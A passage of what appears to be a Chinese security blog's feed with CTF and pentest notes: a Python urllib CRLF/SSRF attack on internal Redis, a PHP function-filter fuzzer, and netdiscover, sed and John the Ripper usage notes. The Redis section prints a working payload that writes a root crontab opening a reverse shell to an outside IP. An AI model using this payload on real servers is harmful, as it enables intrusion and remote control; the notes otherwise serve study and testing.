class="code"><pre><span class="line">User-Agent: Python-urllib&#x2F;3.7</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr></table></figure><h2 id="配合ssrf-redis"><a href="#配合ssrf-redis" class="headerlink" title="配合ssrf,redis"></a>配合ssrf,redis</h2><p>利用CVE-2016-5699 redis未授权访问 计划任务反弹shell</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2462%0d%0a%0d%0a*%2F1%20*%20*%20*%20*%20%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F111.231.169.25%2F5555%200%3E%261%0a%0d%0aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%2Fcrontabs%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0d%0a:6379</span></pre></td></tr></table></figure><p> 如果urllib2抛出<code>URLError:</code>的异常</p><p>可尝试将%2F双重编码 </p><p>url过长也可能抛出异常，可以分为几个url</p><p>urldecode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">*3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$3</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">set</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$62</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;111.231.169.25&#x2F;5555 0&gt;&amp;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">config set dbfilename root</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">save</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">:6379</span></pre></td></tr></table></figure><p> Redis的通讯协议 （ 突破空格的限制）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">*3 &#x2F;&#x2F;表示3个参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$3 &#x2F;&#x2F;下面的参数有3个字节</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">set</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$1 &#x2F;&#x2F;表示下一个参数有一个字节</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$62 &#x2F;&#x2F;表示下一个参数有六十二个字节（加上第一个%0a）</span></pre></td></tr></table></figure><p>不同操作系统的系统任务调度文件 </p><p>用户 XXX 调度文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">ubuntu 下路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Alpine 下路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">debian 下的路径（xxx 可以是任意东西）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;cron.d&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">或者</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">但是写这个路径的时候，文件内不能加用户名。</span></pre></td></tr></table></figure><p>参考</p><p><a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><p><a href="https://strcpy.me/index.php/archives/749/" target="_blank" rel="noopener">Python urllib HTTP头注入漏洞</a></p><p>[<a href="https://www.cnblogs.com/v1vvwv/p/how-to-use-crontab-to-getshell.html" target="_blank" rel="noopener">linux 定时任务 crontab 反弹 shell</a>]</p><p><a href="https://xuanxuanblingbling.github.io/ctf/web/2019/10/13/complex/" target="_blank" rel="noopener">THUCTF2019之ComplexWeb</a></p>]]></content>
    
    <summary type="html">
    
      利用python的urllib CRLF漏洞，进行内网的redis利用
    
    </summary>
    
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="漏洞" scheme="http://h3art3ars.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="python" scheme="http://h3art3ars.github.io/tags/python/"/>
    
      <category term="技巧" scheme="http://h3art3ars.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>phpfuzz</title>
    <link href="http://h3art3ars.github.io/2019/12/11/phpfuzz/"/>
    <id>http://h3art3ars.github.io/2019/12/11/phpfuzz/</id>
    <published>2019-12-11T07:30:00.000Z</published>
    <updated>2019-12-11T07:32:32.121Z</updated>
    
    <content type="html"><![CDATA[<h3 id="php代码审计（含过滤）"><a href="#php代码审计（含过滤）" class="headerlink" title="php代码审计（含过滤）"></a>php代码审计（含过滤）</h3><ul><li><p>先理清楚<a href="https://regex101.com/" target="_blank" rel="noopener">正则</a>过滤，寻找漏过</p></li><li><p>再使用以下脚本fuzz过滤的php函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$allPHPfunNum &#x3D; count(get_defined_functions()[internal]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">echo &quot;当前版本PHP的所有内置php函数数量为&quot;.$allPHPfunNum.&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$a &#x3D; array();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$b &#x3D; 0;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">for($i&#x3D;0; $i &lt; $allPHPfunNum; $i++)&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    $Fun &#x3D; get_defined_functions()[internal][$i];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  if(!preg_match(&#39;&#x2F;_|readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log&#x2F;i&#39;, $Fun))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        $a[$b]&#x3D;$Fun;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        $b++;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">echo &quot;满足过滤条件的函数数量为&quot;.count($a).&quot;&lt;br&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">print_r($a);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>php读取文件函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">file()      &#x2F;&#x2F;把文件读入一个数组中。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">fopen()    &#x2F;&#x2F;打开一个文件或 URL。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">fread()    &#x2F;&#x2F;        读取打开的文件。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">fgets()   &#x2F;&#x2F;从打开的文件中返回一行。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">fgetss()   &#x2F;&#x2F;从打开的文件中读取一行并过滤掉 HTML 和 PHP 标记。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">fgetc()  &#x2F;&#x2F;从打开的文件中返回字符。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">dirname() &#x2F;&#x2F;返回路径中的目录名称部分。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">readfile() &#x2F;&#x2F;读取一个文件，并输出到输出缓冲。</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      在ctf中的正则过滤中，快速找到未被过滤的php函数
    
    </summary>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://h3art3ars.github.io/tags/ctf/"/>
    
      <category term="php" scheme="http://h3art3ars.github.io/tags/php/"/>
    
      <category term="fuzz" scheme="http://h3art3ars.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>netdiscover</title>
    <link href="http://h3art3ars.github.io/2019/12/11/netdiscover/"/>
    <id>http://h3art3ars.github.io/2019/12/11/netdiscover/</id>
    <published>2019-12-11T07:24:40.000Z</published>
    <updated>2019-12-11T07:26:52.148Z</updated>
    
    <content type="html"><![CDATA[<h1 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h1><ul><li><p>快捷使用    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.0&#x2F;24</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">netdiscover -p [-r] 被动模式</span></pre></td></tr></table></figure></li><li></li><li><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Netdiscover是一个简单的ARP扫描器，可用于扫描网络中的活动主机。它也可以扫描多个子网。它只是在实时显示（ncurse）中产生输出。可以在可进入网络的渗透测试的第一阶段中使用。Netdiscover是一个简单的初始侦查工具，非常方便。 </p></li><li><h3 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h3><ol><li>简单的Arp扫描仪</li><li>可在主动和被动模式下工作</li><li>实时显示已识别的主机</li><li>能够扫描多个子网</li><li>定时选项</li></ol></li><li><h3 id="选项："><a href="#选项：" class="headerlink" title="选项："></a>选项：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-i设备：您的网络设备</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-r范围：扫描给定范围而不是自动扫描。192.168.6.0&#x2F;24,&#x2F;16,&#x2F;8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-l文件：扫描包含在给定文件中的范围列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-p被动模式：不发送任何内容，仅嗅探</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">-m文件：扫描已知的MAC和主机名列表</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">-F过滤器：自定义pcap过滤器表达式（默认值：“ arp”）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">-s时间：每个arp请求之间的睡眠时间（毫秒）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">-n节点：用于扫描的最后一个IP八位字节（从2到253）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-c count：发送每个arp请求的次数（对于丢包的网络）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">-f启用快速模式扫描，节省大量时间，建议用于自动</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">-d忽略用于自动扫描和快速模式的家庭配置文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">-S在每个请求之间启用睡眠时间抑制（硬核模式）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">-P打印结果的格式适合于另一个程序进行解析</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">-N不打印标题。仅在启用-P时有效。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">-L在可解析输出模式（-P）中，在活动扫描完成后继续侦听</span></pre></td></tr></table></figure><p><strong>指定范围</strong></p><p>我们可以使用-r选项扫描特定范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -r &lt;范围&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">命令：netdiscover -r 192.168.1.0&#x2F;24</span></pre></td></tr></table></figure><p><strong>文件中的多个范围</strong></p><p>我们还可以扫描多个范围。当您的大型网络具有多个子网和网络时，这很有用。为此，我们只需要逐行指定要扫描的所有范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -l &lt;包含范围的文件&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">命令：netdiscover -l 范围</span></pre></td></tr></table></figure><p>有时最好保持安静。-p选项对此有所帮助，但要以耐心为代价。        </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -p -r &lt;范围，可选&gt;</span></pre></td></tr></table></figure><p><strong>输出</strong></p><p>如果要将其通过管道传输到文件，也有一个可分析的输出选项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：netdiscover -P &lt;可分析&gt; -N &lt;省略标题&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">命令：netdiscover -r 192.168.1.1&#x2F;24 -PN</span></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      netdiscover用于快速的主动或被动的发现存活主机
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
    
      <category term="扫描" scheme="http://h3art3ars.github.io/tags/%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>sed</title>
    <link href="http://h3art3ars.github.io/2019/12/11/sed/"/>
    <id>http://h3art3ars.github.io/2019/12/11/sed/</id>
    <published>2019-12-11T07:12:47.000Z</published>
    <updated>2019-12-11T07:19:39.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h1><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>sed [-hnV] [-e (script)][-f (script-file)][file]</code></p><p><strong>参数说明</strong>：</p><ul><li>-e script或–expression=script 以选项中指定的script来处理输入的文本文件。<strong>可使用多个-e参数执行多个动作</strong></li><li>-f&lt;script文件&gt;或–file=&lt;script文件&gt; 以选项中指V定的script文件来处理输入的文本文件。</li><li>-h或–help 显示帮助。</li><li>-n或–quiet或–silent 仅显示script处理后的结果。</li><li>-V或–version 显示版本信息。</li><li>-i 直接替换文件中内容，不用打开</li></ul><p><strong>动作说明</strong>：</p><ul><li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li><li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li><li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li><li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li><li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～</li><li>s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g </li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>1.添加–<strong>a</strong>（行后）</p><pre><code>在第四行添加一行内容为  *newline*`sed &apos;4a newline&apos;`</code></pre><p>2.取代–<strong>c</strong></p><pre><code>将2-5行内容换成*2-5line*`sed &apos;2,5c 2-5line&apos;`2-5行的全部内容换成一个字串2-5line，并不是每行都会单独取代</code></pre><p>3.删除–<strong>d</strong></p><pre><code>删除4到最后一行`sed &apos;4,$d&apos;`</code></pre><p>4.插入–<strong>i</strong>（行前）</p><pre><code>在第1行插入内容为*firstline*与secline两行`sed &apos;1i first\``secline&apos;`</code></pre><p>5.搜寻</p><pre><code>寻找含有root的行并删除`sed &apos;/root/d&apos;`</code></pre><p>5.替换–<strong>s</strong></p><pre><code>`sed s/被替换/替换/g`类似vim一样的用法</code></pre><p><strong>去除空行用vim中<code>：%s/\n//g</code> 不要用sed ，很复杂</strong></p>]]></content>
    
    <summary type="html">
    
      sed命令，可对文件进行插入，添加，删除。替换操作
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="文件操作" scheme="http://h3art3ars.github.io/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>john</title>
    <link href="http://h3art3ars.github.io/2019/12/11/john/"/>
    <id>http://h3art3ars.github.io/2019/12/11/john/</id>
    <published>2019-12-11T07:04:58.000Z</published>
    <updated>2019-12-11T07:09:32.423Z</updated>
    
    <content type="html"><![CDATA[<h1 id="john"><a href="#john" class="headerlink" title="john"></a>john</h1><ul><li><h3 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;rockyou.txt .&#x2F;shadow</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">john --show .&#x2F;shadow</span></pre></td></tr></table></figure></li><li><h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p><img src="/images/john.png" alt="help"></p></li><li><h3 id="attact"><a href="#attact" class="headerlink" title="attact"></a>attact</h3><p> 在破解密码方面，有三种类型的攻击：<br>1.暴力破解：通过依次处理每个可能的字母、数字和特殊字符组合来猜测密码。这是一个很漫长的过程，但却很有效果。<br>2.字典攻击：此攻击利用包含常见密码列表的文件(通常取自某种类型的漏洞)来猜测给定的密码。在CTF中应用比较广泛，但在正常情况下不是特别常见。<br>3.彩虹表：彩虹表是一系列预先计算好的散列。其思想是，这些彩虹表包含给定算法的所有散列。通过查找代替了破解。请注意，这需要相当大的处理能力才能实现。 </p></li><li><h3 id="默认大字典"><a href="#默认大字典" class="headerlink" title="默认大字典"></a>默认大字典</h3><p><a href="https://wiki.skullsecurity.org/Passwords" target="_blank" rel="noopener">字典地址</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo gunzip &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">wc -l &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span></pre></td></tr></table></figure></li><li><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li><h4 id="linux密码"><a href="#linux密码" class="headerlink" title="linux密码"></a>linux密码</h4><p>将passwd与shadow转换成john可破解格式（现已可直接破解）</p><p><code>unshadow /etc/passed /etc/shadow &gt; ./password</code></p><p><code>john --wordlist=/usr/share/wordlist/rockyou.txt ./password</code></p></li><li><h4 id="SSH密钥"><a href="#SSH密钥" class="headerlink" title="SSH密钥"></a>SSH密钥</h4><p> 要测试JTR的SSH密钥密码破解能力，首先要创建一组新的私钥。注意：JTR没有破解文件本身(即生成的密钥中的字节数并不重要)，JTR只是破解私钥的加密密码。<br>在这种情况下，使用可预测的密码创建公钥/私钥对： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># Create some private key</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># Create encrypted zip</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;sbin&#x2F;ssh2john ~&#x2F;.ssh&#x2F;id_rsa &gt; id_rsa.hash</span></pre></td></tr></table></figure><p>接下来，您需要做的就是使用您的字典将John the Ripper指向给定文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt id_rsa.hash</span></pre></td></tr></table></figure></li><li><h4 id="Keepass2数据库（不常用）"><a href="#Keepass2数据库（不常用）" class="headerlink" title="Keepass2数据库（不常用）"></a>Keepass2数据库（不常用）</h4><p> Keepass怎么样？如果您不知道，Keepass是一个开源的，跨平台的密码管理库。<br> 所以让我们创建一个可以攻击的库。首先，安装Keepass CLI(“kpcli”)。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y kpcli</span></pre></td></tr></table></figure><p> 接下来，创建库。你不需要在库里存储任何密码，一个空的库就可以了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ kpcli</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">KeePass CLI (kpcli) v3.1 is ready for operation.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Type &#39;help&#39; for a description of available commands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Type &#39;help &lt;command&gt;&#39; for details on individual commands.</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">kpcli:&#x2F;&gt; saveas newdb.kdb</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">Please provide the master password: *************************</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">Retype to verify: *************************</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">kpcli:&#x2F;&gt; exit</span></pre></td></tr></table></figure><p> 与攻击SSH私钥和Linux密码散列一样，将Keepass数据库转换为与JTR兼容的格式。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">keepass2john newdb.kdb &gt; newdb.kdb.hash</span></pre></td></tr></table></figure><p> 攻击！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt newdb.kdb.hash</span></pre></td></tr></table></figure></li><li><h4 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h4> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"># Install rar</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y rar</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"># Create some dummy file</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">echo &quot;Hello&quot; &gt; hello.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"># Create an encrypted RAR file with the password &quot;password&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">rar a -hppassword encrypted.rar hello.txt</span></pre></td></tr></table></figure><p> 接下来，将其转换为JTR的攻击格式：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">rar2john encrypted.rar &gt; encrypted.rar.hash</span></pre></td></tr></table></figure><p> 之后用john破解</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      使用john暴力破解linux的shadow文件
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="密码破解" scheme="http://h3art3ars.github.io/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>hashcat</title>
    <link href="http://h3art3ars.github.io/2019/12/11/hashcat/"/>
    <id>http://h3art3ars.github.io/2019/12/11/hashcat/</id>
    <published>2019-12-11T06:58:11.000Z</published>
    <updated>2019-12-11T07:01:52.751Z</updated>
    
